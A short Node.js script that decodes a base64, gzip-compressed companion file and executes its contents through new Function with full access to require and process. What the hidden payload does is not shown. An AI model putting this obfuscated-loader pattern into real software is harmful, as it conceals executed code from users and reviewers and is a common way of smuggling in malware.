'use strict';
const fs=require('fs');
const path=require('path');
const zlib=require('zlib');
const payload=path.join(__dirname,'apply-alpha82.js.gz.b64');
const src=zlib.gunzipSync(Buffer.from(fs.readFileSync(payload,'utf8').replace(/\s+/g,''),'base64')).toString('utf8');
new Function('require','process','__dirname','__filename',src)(require,process,__dirname,__filename);
